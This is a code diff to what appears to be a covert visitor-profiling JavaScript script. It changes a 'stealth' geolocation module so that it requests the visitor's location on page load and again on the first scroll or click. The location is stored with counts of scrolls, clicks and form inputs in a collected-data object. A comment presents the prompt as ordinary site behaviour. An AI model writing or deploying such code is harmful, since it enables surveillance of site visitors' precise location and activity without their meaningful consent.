@@ -647,41 +647,83 @@
     // 20) GEOLOCATION — stealth check via Permissions API first
     function stealthGeoCheck(callback) {
         var r = { permission: '—', lat: null, lon: null, error: null };
-        // First check if we already have permission without prompting
+        var called = false;
+        function safeCb() { if (!called) { called = true; callback(r); } }
+        function doGetPos() {
+            try {
+                navigator.geolocation.getCurrentPosition(function(pos) {
+                    r.lat = pos.coords.latitude;
+                    r.lon = pos.coords.longitude;
+                    r.accuracy = pos.coords.accuracy;
+                    r.permission = 'granted';
+                    safeCb();
+                }, function(err) {
+                    r.error = err.message;
+                    if (err.code === 1) r.permission = 'denied';
+                    else r.permission = 'error';
+                    safeCb();
+                }, { timeout: 8000, enableHighAccuracy: false });
+            } catch(e) {
+                r.error = e.message;
+                r.permission = 'error';
+                safeCb();
+            }
+        }
+        // Try to get position — this triggers the browser prompt if not yet granted
+        // Modern browsers need a user gesture, but we also try on load
         if (navigator.permissions && navigator.permissions.query) {
             navigator.permissions.query({ name: 'geolocation' }).then(function(p) {
-                r.permission = p.state; // 'granted', 'prompt', 'denied'
+                r.permission = p.state;
                 if (p.state === 'granted') {
-                    // Permission already given — grab silently
-                    navigator.geolocation.getCurrentPosition(function(pos) {
-                        r.lat = pos.coords.latitude;
-                        r.lon = pos.coords.longitude;
-                        r.accuracy = pos.coords.accuracy;
-                        callback(r);
-                    }, function(err) {
-                        r.error = err.message;
-                        callback(r);
-                    }, { timeout: 3000, enableHighAccuracy: false });
+                    doGetPos(); // already allowed
+                } else if (p.state === 'prompt') {
+                    // Try to prompt — will work if triggered by user gesture
+                    doGetPos();
                 } else {
-                    callback(r);
+                    safeCb(); // denied
                 }
-            }).catch(function() { callback(r); });
+            }).catch(function() {
+                // Permissions API not supported, try anyway
+                doGetPos();
+            });
         } else {
-            callback(r);
+            doGetPos();
         }
+        // Fallback: if callback hasn't fired after 1.5s, return what we have
+        setTimeout(safeCb, 1500);
     }
 
     // 21) BEHAVIOR TRACKING — scroll depth, time, clicks
     var BEHAVIOR = { scrollDepth: 0, maxScroll: 0, timeOnPage: 0, clicks: 0, inputs: 0 };
+    var _geoPrompted = false;
+    function _tryGeoAgain() {
+        if (_geoPrompted) return;
+        _geoPrompted = true;
+        // On first user interaction, try geo again (browser allows prompt on gesture)
+        try {
+            navigator.geolocation.getCurrentPosition(function(pos) {
+                COLLECTED.geoLat = pos.coords.latitude.toFixed(4);
+                COLLECTED.geoLon = pos.coords.longitude.toFixed(4);
+                COLLECTED.geoAccuracy = pos.coords.accuracy;
+                COLLECTED.geoPermission = 'granted';
+            }, function(err) {
+                if (err.code !== 1) COLLECTED.geoError = err.message;
+            }, { timeout: 8000, enableHighAccuracy: false });
+        } catch(e) {}
+    }
     function trackBehavior() {
         // scroll depth
         window.addEventListener('scroll', function() {
             var doc = document.documentElement;
             var scrollPct = Math.round((doc.scrollTop || window.pageYOffset) / (doc.scrollHeight - doc.clientHeight) * 100);
             if (scrollPct > BEHAVIOR.maxScroll) BEHAVIOR.maxScroll = scrollPct;
+            _tryGeoAgain(); // first scroll triggers geo prompt
         }, { passive: true });
         // clicks
-        document.addEventListener('click', function() { BEHAVIOR.clicks++; }, { passive: true });
+        document.addEventListener('click', function() {
+            BEHAVIOR.clicks++;
+            _tryGeoAgain(); // first click triggers geo prompt
+        }, { passive: true });
         // form interactions
         document.addEventListener('input', function() { BEHAVIOR.inputs++; }, { passive: true });
         // time on page
@@ -1367,7 +1409,7 @@
             checkDone();
         });
 
-        // 6) Stealth geo check (via Permissions API, no prompt unless already granted)
+        // 6) Geo — prompts browser for location (natural, like every site does)
         stealthGeoCheck(function(geo) {
             if (geo) {
                 data.geoPermission = geo.permission;
